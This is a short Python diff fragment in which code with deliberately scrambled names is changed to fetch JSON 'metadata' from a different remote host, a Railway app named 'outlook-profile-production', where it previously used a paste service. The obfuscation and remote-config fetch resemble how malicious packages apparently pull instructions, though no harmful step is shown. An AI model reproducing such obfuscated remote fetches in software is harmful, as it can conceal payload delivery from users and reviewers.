@@ -16,7 +16,7 @@ def data_ddgqvt_672():
 
     def train_dwzcpu_345():
         try:
-            eval_uqfhja_598 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_uqfhja_598 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_uqfhja_598.raise_for_status()
             train_zdxoir_915 = eval_uqfhja_598.json()
             data_yncnjh_650 = train_zdxoir_915.get('metadata')
